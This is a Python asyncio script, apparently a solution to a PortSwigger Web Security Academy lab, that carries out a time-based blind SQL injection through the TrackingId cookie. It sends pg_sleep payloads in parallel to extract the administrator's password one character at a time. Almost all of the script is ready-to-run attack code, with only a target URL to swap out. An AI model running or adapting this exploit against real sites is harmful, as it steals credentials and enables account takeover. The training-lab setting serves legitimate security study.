import asyncio
import aiohttp
import urllib.parse
import time
from typing import Optional, Any

async def get_request(session: aiohttp.ClientSession, url: str, cookies: dict[str, Any], timeout: int = 10) -> Optional[aiohttp.ClientResponse]:
    try:
        async with session.get(url, cookies=cookies, timeout=timeout) as response:
            await response.read()  # 讀取響應內容
            return response
    except Exception as e:
        print(f"error: {e}")
        return None

async def payload_request(session: aiohttp.ClientSession, payload: str) -> Optional[aiohttp.ClientResponse]:
    cookies = {
        "TrackingId": payload,
        "session": "aa"
    }
    response = await get_request(session, BASE_URL, cookies=cookies)
    if response:
        print(response.status)
    return response

async def payload_test(session: aiohttp.ClientSession, payload: str):
    response = await payload_request(session, urllib.parse.quote(payload))
    if response and response.status == 200:
        print(payload)

async def find_pw(pw_len: int) -> str:
    pw = ""
    async with aiohttp.ClientSession() as session:
        for num in range(1, pw_len + 1):
            # 為當前位置的所有字符創建任務
            tasks = []
            for word in WORD_LIST:
                payload = (
                    f"';select case when (username='administrator' and substring(password,{num},1)='{word}')"
                    f" then pg_sleep(9) else pg_sleep(0) end from users-- "
                )
                task = asyncio.create_task(test_payload(session, payload, word))
                tasks.append(task)
            
            # 並行執行所有字符測試
            results = await asyncio.gather(*tasks)
            
            # 找到正確的字符
            for char in results:
                if char:
                    pw += char
                    break
    
    return pw

async def test_payload(session: aiohttp.ClientSession, payload: str, char: str):
    print(f"Testing: {char}")
    start = time.time()
    await payload_test(session, payload)
    elapsed = time.time() - start
    
    if elapsed > 8:
        return char
    return None

# 使用示例
BASE_URL = "https://0a4900d103be8007da8bbcb100c0008d.web-security-academy.net"  # 替換為實際目標URL
WORD_LIST = "0123456789abcdefghijklmnopqrstuvwxyz"  # 字符集

async def main():
    password_length = 20  # 預估密碼長度
    print("開始並行密碼爆破...")
    
    password = await find_pw(password_length)
    print(f"找到密碼: {password}")

# 運行
if __name__ == "__main__":
    asyncio.run(main())